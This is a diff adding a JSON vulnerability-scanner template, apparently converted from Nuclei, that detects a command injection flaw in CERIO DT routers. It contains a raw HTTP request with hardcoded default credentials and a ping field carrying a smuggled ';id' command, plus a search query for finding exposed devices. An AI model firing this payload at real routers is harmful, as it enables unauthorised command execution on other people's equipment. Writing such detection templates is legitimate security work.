@@ -1,0 +1,142 @@
+{
+  "id": "cerio-dt-rce",
+  "name": "CERIO-DT Interface - Command Execution",
+  "author": "pussycat0x",
+  "severity": "CRITICAL",
+  "description": "CERIO DT series routers have an operation command injection vulnerability in specific versions. An attacker could exploit this vulnerability to execute commands.\n",
+  "references": [
+    "https://github.com/20142995/sectool",
+    "https://github.com/tanjiti/sec_profile",
+    "https://github.com/wy876/POC/blob/main/D-Link_DAR-8000%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2023-4542).md"
+  ],
+  "tags": [
+    "cerio",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"DT-100G-N\" || title\u003d\"DT-300N\" || title\u003d\"DT-100G\" || title\u003d\"AMR-3204G\" || title\u003d\"WMR-200N\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /cgi-bin/Save.cgi?cgi\u003dPING HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic b3BlcmF0b3I6MTIzNA\u003d\u003d\nContent-Type: application/x-www-form-urlencoded\n\npid\u003d2061\u0026ip\u003d127.0.0.1;id\u0026times\u003d1\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "uid\u003d([0-9(a-z)]+) gid\u003d([0-9(a-z)]+)"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "cerio-dt-rce",
+    "info": {
+      "name": "CERIO-DT Interface - Command Execution",
+      "author": "pussycat0x",
+      "severity": "critical",
+      "description": "CERIO DT series routers have an operation command injection vulnerability in specific versions. An attacker could exploit this vulnerability to execute commands.\n",
+      "reference": [
+        "https://github.com/20142995/sectool",
+        "https://github.com/tanjiti/sec_profile",
+        "https://github.com/wy876/POC/blob/main/D-Link_DAR-8000%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2023-4542).md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "title\u003d\"DT-100G-N\" || title\u003d\"DT-300N\" || title\u003d\"DT-100G\" || title\u003d\"AMR-3204G\" || title\u003d\"WMR-200N\""
+      },
+      "tags": "cerio,rce"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /cgi-bin/Save.cgi?cgi\u003dPING HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic b3BlcmF0b3I6MTIzNA\u003d\u003d\nContent-Type: application/x-www-form-urlencoded\n\npid\u003d2061\u0026ip\u003d127.0.0.1;id\u0026times\u003d1\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "uid\u003d([0-9(a-z)]+) gid\u003d([0-9(a-z)]+)"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
